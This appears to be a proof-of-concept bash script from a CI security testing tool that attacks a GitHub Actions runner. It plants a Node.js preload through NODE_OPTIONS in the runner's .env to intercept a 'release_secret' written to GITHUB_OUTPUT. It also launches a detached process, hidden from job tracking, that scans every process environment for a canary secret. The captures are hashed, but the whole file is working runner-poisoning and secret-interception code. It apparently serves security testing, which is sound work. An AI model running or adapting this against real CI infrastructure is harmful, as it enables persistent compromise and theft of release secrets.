#!/usr/bin/env bash
set -euo pipefail

runner_root=$(cd "$RUNNER_TEMP/../.." && pwd)
preload="$runner_root/pwnreq-node-preload.js"
cat > "$preload" <<'JS'
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const originalAppend = fs.appendFileSync.bind(fs);
const originalWrite = fs.writeFileSync.bind(fs);
const capturePath = path.join(__dirname, 'pwnreq-env-preload.capture');

fs.appendFileSync = function patchedAppend(file, data, ...args) {
  try {
    const text = Buffer.isBuffer(data) ? data.toString('utf8') : String(data);
    const match = text.match(/release_secret<<([^\n]+)\n([\s\S]*?)\n\1(?:\n|$)/);
    if (file === process.env.GITHUB_OUTPUT && match) {
      const digest = crypto.createHash('sha256').update(match[2]).digest('hex');
      originalWrite(capturePath, `sha256:${digest}\n`, { encoding: 'utf8' });
    }
  } catch (_) {
    // The controlled proof must not interfere with the action under test.
  }
  return originalAppend(file, data, ...args);
};
JS
env_tmp=$(mktemp)
if [[ -f "$runner_root/.env" ]]; then
  grep -v '^NODE_OPTIONS=' "$runner_root/.env" > "$env_tmp" || true
fi
printf 'NODE_OPTIONS=--require=%s\n' "$preload" >> "$env_tmp"
mv "$env_tmp" "$runner_root/.env"
printf 'attack_run_id=%s\nattack_runner_name=%s\nattack_utc=%s\npreload=%s\n' \
  "$GITHUB_RUN_ID" "$RUNNER_NAME" "$(date -u +%FT%TZ)" "$preload" \
  > "$runner_root/pwnreq-env-preload.meta"
echo "planted-runner-env-preload=true"

rm -f /tmp/pwnreq-survivor.capture /tmp/pwnreq-survivor.finished
script=/tmp/pwnreq-survivor.sh
printf '%s\n' \
  '#!/usr/bin/env bash' \
  'deadline=$((SECONDS + 600))' \
  'while (( SECONDS < deadline )); do' \
  '  for envfile in /proc/[0-9]*/environ; do' \
  '    value=$(tr "\0" "\n" < "$envfile" 2>/dev/null | sed -n "s/^RELEASE_CANARY=//p" | head -n 1) || true' \
  '    if [[ -n "$value" ]]; then' \
  '      digest=$(printf "%s" "$value" | sha256sum | cut -d" " -f1)' \
  '      printf "sha256:%s\n" "$digest" > /tmp/pwnreq-survivor.capture' \
  '      : > /tmp/pwnreq-survivor.finished' \
  '      exit 0' \
  '    fi' \
  '  done' \
  '  sleep 0.1' \
  'done' > "$script"
chmod 700 "$script"
RUNNER_TRACKING_ID='' nohup "$script" \
  >/tmp/pwnreq-survivor.log 2>&1 </dev/null &
survivor_pid=$!
survivor_start=$(awk '{print $22}' "/proc/${survivor_pid}/stat")
printf '%s:%s\n' "$survivor_pid" "$survivor_start" > /tmp/pwnreq-survivor.meta
echo "planted-survivor-pid=${survivor_pid}"
